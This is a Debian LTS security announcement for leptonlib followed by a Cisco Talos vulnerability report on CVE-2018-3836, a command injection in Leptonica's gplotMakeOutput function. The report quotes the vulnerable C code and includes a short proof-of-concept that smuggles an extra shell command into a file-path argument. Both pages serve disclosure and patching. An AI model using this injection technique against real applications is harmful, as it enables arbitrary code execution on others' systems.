=== Content from lists.debian.org_83f0786f_20250125_154404.html ===


---

[[Date Prev](msg00018.html)][[Date Next](msg00020.html)]
[[Thread Prev](msg00018.html)][[Thread Next](msg00020.html)]
[[Date Index](maillist.html#00019)]
[[Thread Index](threads.html#00019)]

# [SECURITY] [DLA 1284-1] leptonlib security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 1284-1] leptonlib security update
* *From*: Abhijith PA <abhijith@disroot.org>
* *Date*: Thu, 15 Feb 2018 15:08:37 +0530
* *Message-id*: <[[ðŸ”Ž]](/msgid-search/490bed81-0bcf-a0de-d2f7-b02b163516f7%40disroot.org)Â [490bed81-0bcf-a0de-d2f7-b02b163516f7@disroot.org](msg00019.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Package        : leptonlib
Version        : 1.69-3.1+deb7u1
CVE ID         : CVE-2018-3836
Debian Bug     : 889759

Talosintelligence discovered a command injection vulnerability in the
gplotMakeOutput function of leptonlib. A specially crafted gplot
rootname argument can cause a command injection resulting in arbitrary
code execution. An attacker can provide a malicious path as input to an
application that passes attacker data to this function to trigger this
vulnerability.

For Debian 7 "Wheezy", these problems have been fixed in version
1.69-3.1+deb7u1.

We recommend that you upgrade your leptonlib packages.

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEE7xPqJqaY/zX9fJAuhj1N8u2cKO8FAlqFVRYACgkQhj1N8u2c
KO+JrQ//WQAuSSEkIOetjtAR8k1Lar9sj6Qc3rQL0LF2jXFr4CvkMJdrOYLm/2UA
9yNXJ5lc2JbAvECfnWWVlQHiULEwgEmrxG5KhzlWP6UP+wkC2ua6ialtgLZswloT
NOTCosFucwGwulh8WhVy0AJvvqlD9ksB604QG6HxtaMgZoFx97GLvCmsPCRAbs4v
KXp5BmJMSaoVBj9XyfNKNTsBF5cMwHLR8pnQdGFrx3X+dfYZvi31JWuliLYILjJu
ZfpLyd1iBEKzwXsLxsEcpK1hdDp146MNJvI5JTON+cQ9tty0FeUnGCUj0/LE/LtO
+k3o74hUtRbw/Jga7VmJtyp97bXRgTggMZ18mwjRciVBDuwCF1sUNAeCHt8dBQI5
ZFHF7vL5YGqf1kqXtRytdYNrhQQVCZK8Mh/zsE0J5njyt55ilxwecPjqFXhASdW9
p+5w8/IkCNnVHc5n2ASt5aiWBJwJUeRTe3IrnzkAHy5RiYK8GaxlTbumP1XKhJzp
V7RYhr/vpWBc+pkfxYIpnbY0f4YcJB9CfI++HEsTsQOF1v5ElWmeUGp2v9nvopR6
YKlvED2V2sfOvZwdDr7CeYzaSkhFM9BXCgVQ/qOsIGhxlnf+7hlIeL8x4BtYLq2w
hsv4WzGFCTxW6zjGl2DckfRvvBZnsQuRBRivc78HIacALa0bERE=
=PSHC
-----END PGP SIGNATURE-----

```

---



=== Content from www.talosintelligence.com_c65a9d79_20250125_154405.html ===


* [Cisco Login](/users/auth/saml)

* [Intelligence Center](/reputation)

  + [# Intelligence Center](/reputation)
  + BACK
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* [Vulnerability Research](/vulnerability_info)

  + [# Vulnerability Research](/vulnerability_info)
  + BACK
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* [Incident Response](/incident_response)

  + [# Incident Response](/incident_response)
  + BACK
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* [Blog](https://blog.talosintelligence.com)
* [Support](https://support.talosintelligence.com)

More

* Security Resources

  # Security Resources

  + BACK
  Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* Media

  # Media

  + BACK
  Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* Company

  # Company

  + BACK
  Company
  + [About Talos](/about)
  + [Careers](/careers)

* Under Attack?
* [Cisco Login](/users/auth/saml)

## Contact Cisco Talos Incident Response

Ã—

Close

This form is for Incident Response service inquiries only, including emergency network security needs.

For reputation or categorization inquiries, visit the [Talos Support site](/support).
For emergency DDoS mitigation assistance, please contact the [Cisco Secure DDoS Protection Team](https://www.cisco.com/c/en/us/products/collateral/security/ddos-emergency-attack-mitigation-aag.pdf).

Name

Company (optional)

Email address

Phone number

Preferred communication:

Email

Phone

What Incident Response Service are you interested in?
General Talos IR services and retainer information
Emergency Response
IR Plan
IR Playbooks
IR Readiness Assessment
Tabletop Exercises
Compromise Assessment
Threat Hunting
Cyber Range Training
Intelligence on Demand

Please provide as much detail as possible so we can best address your needs

I acknowledge that this is an inquiry for Incident Response services and that any other use of this form will not receive a response.

Send Email
Cancel

# Talos Vulnerability Report

### TALOS-2018-0516

## Leptonica gplotMakeOutput Command Injection Vulnerability

##### January 22, 2018

##### CVE Number

CVE-2018-3836

### Summary

An exploitable command injection vulnerability exists in the gplotMakeOutput function of Leptonica 1.74.4.
A specially crafted gplot rootname argument can cause a command injection resulting in arbitrary code execution.
An attacker can provide a malicious path as input to an application that passes attacker data to this function to trigger this vulnerability.

### Tested Versions

Leptonica 1.74.4

### Product URLs

<http://www.leptonica.com/>

### CVSSv3 Score

7.0 - CVSS:3.0/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H

### CWE

CWE-78: Improper Neutralization of Special Elements used in an OS Command (â€˜OS Command Injectionâ€™)

### Details

Leptonica is an open source library mainly used for image processing and analysis. An OS Command Injection vulnerability exists in gplotMakeOutput function. A lack of sanitization of the `gplot->cmdname` field could allow an attacker to inject an arbitrary command which is later executed via the `system` function.

Let us take a closer look at the vulnerable function:

```
Line 374	l_int32
Line 375	gplotMakeOutput(GPLOT  *gplot)
Line 376	{
Line 377	char     buf[L_BUF_SIZE];
Line 378	char    *cmdname;
Line 379	l_int32  ignore;
Line 380
Line 381		PROCNAME("gplotMakeOutput");
Line 382
Line 383		if (!gplot)
Line 384			return ERROR_INT("gplot not defined", procName, 1);
Line 385
Line 386		gplotGenCommandFile(gplot);
Line 387		gplotGenDataFiles(gplot);
Line 388		cmdname = genPathname(gplot->cmdname, NULL);
Line 389
Line 390	#ifndef _WIN32
Line 391		snprintf(buf, L_BUF_SIZE, "gnuplot %s", cmdname);
Line 392	#else
Line 393		snprintf(buf, L_BUF_SIZE, "wgnuplot %s", cmdname);
Line 394	#endif  /* _WIN32 */
Line 395
Line 396	#ifndef OS_IOS /* iOS 11 does not support system() */
Line 397		ignore = system(buf);  /* gnuplot || wgnuplot */
Line 398	#endif /* !OS_IOS */

```

At `line 397` we can see a call to the `system` function which takes `buf` as parameter. This variable is created based on the `gnuplot` application name and the content of the `cmdname` field.
The `cmdname` field is initialized inside the `gplotCreate` function :

```
Line 137	GPLOT  *
Line 138	gplotCreate(const char  *rootname,
Line 139				l_int32      outformat,
Line 140				const char  *title,
Line 141				const char  *xlabel,
Line 142				const char  *ylabel)
Line 143	{
Line 144	char   *newroot;
Line 145	char    buf[L_BUF_SIZE];
Line 146	GPLOT  *gplot;
Line 147
Line 148		PROCNAME("gplotCreate");
Line 149
Line 150		if (!rootname)
Line 151			return (GPLOT *)ERROR_PTR("rootname not defined", procName, NULL);
Line 152		if (outformat != GPLOT_PNG && outformat != GPLOT_PS &&
Line 153			outformat != GPLOT_EPS && outformat != GPLOT_LATEX)
Line 154			return (GPLOT *)ERROR_PTR("outformat invalid", procName, NULL);
Line 155
Line 156		if ((gplot = (GPLOT *)LEPT_CALLOC(1, sizeof(GPLOT))) == NULL)
Line 157			return (GPLOT *)ERROR_PTR("gplot not made", procName, NULL);
Line 158		gplot->cmddata = sarrayCreate(0);
Line 159		gplot->datanames = sarrayCreate(0);
Line 160		gplot->plotdata = sarrayCreate(0);
Line 161		gplot->plottitles = sarrayCreate(0);
Line 162		gplot->plotstyles = numaCreate(0);
Line 163
Line 164			/* Save title, labels, rootname, outformat, cmdname, outname */
Line 165		newroot = genPathname(rootname, NULL);
Line 166		gplot->rootname = newroot;
Line 167		gplot->outformat = outformat;
Line 168		snprintf(buf, L_BUF_SIZE, "%s.cmd", rootname);
Line 169		gplot->cmdname = stringNew(buf);

```

At `lines 168-169` we see that the argument `rootname` is copied to `gplot->cmdname`. The variable `rootname` should represent the root path name for all plotting operations, but
because this parameter can be dynamically set based on data coming from a user it should be sanitized..
A malicious user can create a path containing one of several special characters [ | , &, ` ` ] which allows for adding additional command and which in consequence can lead to arbitrary code execution.

### Exploit Proof-of-Concept

```
#include "allheaders.h"
int main()

	GPLOT       *gplot;
	gplot = gplotCreate("/tmp/lept/histo/color & calc ", GPLOT_PNG,
		"color histogram with octcube indexing",
		"octcube index", "number of pixels in cube");
	gplotMakeOutput(gplot);
	return 0;

```
### Timeline

2018-01-22 - Vendor Disclosure

2018-02-01 - Public Release

##### Credit

Discovered by Marcin 'Icewall' Noga of Cisco Talos.

---

[Vulnerability Reports](/vulnerability_reports) [Next Report

TALOS-2018-0515](/vulnerability_reports/TALOS-2018-0515) [Previous Report

TALOS-2017-0486](/vulnerability_reports/TALOS-2017-0486)

* + ###### [Intelligence Center](/reputation)
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* + ###### [Vulnerability Research](/vulnerability_info)
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* + ###### [Incident Response](/incident_response)
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* + ###### Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* + ###### Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* + ###### Support
  + [Support Documentation](https://support.talosintelligence.com)
* + ###### Company
  + [About Talos](/about)
  + [Careers](/careers)
  + [Cisco Security](https://www.cisco.com/c/en/us/products/security/product-listing.html)

###### Follow us

[![Cisco](/assets/logo_cisco_white-d87b7f7d3152ad412e48aad924a972cc5b802b7a53cb56b0792a4456c9b7b3a5.svg)](http://tools.cisco.com/security/center/home.x)

Â©
2025
Cisco Systems, Inc. and/or its affiliates. All rights
reserved. View our
[Privacy Policy.](http://www.cisco.com/web/siteassets/legal/privacy_full.html)


